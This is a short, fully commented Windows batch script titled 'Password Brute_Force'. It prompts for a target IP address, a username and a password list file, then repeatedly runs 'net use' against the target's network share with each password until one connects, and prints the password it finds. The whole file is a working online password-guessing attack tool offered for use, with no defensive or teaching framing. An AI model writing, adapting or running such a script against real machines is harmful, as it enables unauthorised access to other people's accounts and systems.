@echo off
title Password Brute_Force -- DRA3V50 (Dany A.)  :: Sets the command window title
color 0C

:: Ask user for target IP address
set /p target=Target IP: 

:: Ask user for the username to try
set /p user=Username: 

:: Ask user for the password list filename
set /p file=Password file (e.g., commonpass.txt): 

:: Check if the password file exists; if not, show error and exit
if not exist "%file%" (
  echo File "%file%" not found.
  pause
  exit /b
)

:: Enable delayed expansion to safely use variables inside loops
setlocal enabledelayedexpansion

:: Initialize a counter for attempts
set /a count=0

:: Loop through each line (password) in the password file
for /f "usebackq delims=" %%p in ("%file%") do (
  set /a count+=1                          :: Increment attempt counter
  set "pw=%%p"                            :: Store current password in variable pw
  echo Trying password [!count!]: !pw!   :: Display attempt number and password being tested

  :: Attempt to connect using net use with the username and current password
  net use \\%target% /user:%user% "!pw!" >nul 2>&1

  :: Check if the previous command succeeded (errorlevel 0 means success)
  if !errorlevel! == 0 (
    echo.                                :: Blank line for readability
    echo === SUCCESS ===                  :: Indicate success
    echo Password found: !pw!            :: Show the successful password
    net use \\%target% /delete /yes >nul 2>&1  :: Disconnect the network connection
    pause                              :: Pause so user can read the message
    exit /b                            :: Exit script successfully
  )
)

echo.                                  :: Blank line before failure message
echo === FAILED ===                    :: Indicate no password matched
echo No matching password found after !count! attempts.  :: Show total attempts made
pause                                :: Pause so user can read the message
exit /b                             :: Exit script

